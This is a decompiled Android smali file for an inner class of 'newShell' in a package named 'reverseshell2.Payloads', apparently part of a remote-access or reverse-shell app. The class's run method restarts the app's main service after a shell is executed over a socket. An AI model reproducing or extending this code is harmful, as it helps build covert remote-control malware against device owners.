.class Lcom/example/reverseshell2/Payloads/newShell$1;
.super Ljava/lang/Object;
.source "newShell.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/newShell;->executeShell(Ljava/net/Socket;Ljava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/newShell;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/newShell;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/newShell;

    .line 115
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/newShell$1;->this$0:Lcom/example/reverseshell2/Payloads/newShell;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 118
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/newShell$1;->this$0:Lcom/example/reverseshell2/Payloads/newShell;

    iget-object v0, v0, Lcom/example/reverseshell2/Payloads/newShell;->context:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/newShell$1;->this$0:Lcom/example/reverseshell2/Payloads/newShell;

    iget-object v2, v2, Lcom/example/reverseshell2/Payloads/newShell;->context:Landroid/content/Context;

    const-class v3, Lcom/example/reverseshell2/mainService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 119
    return-void
.end method
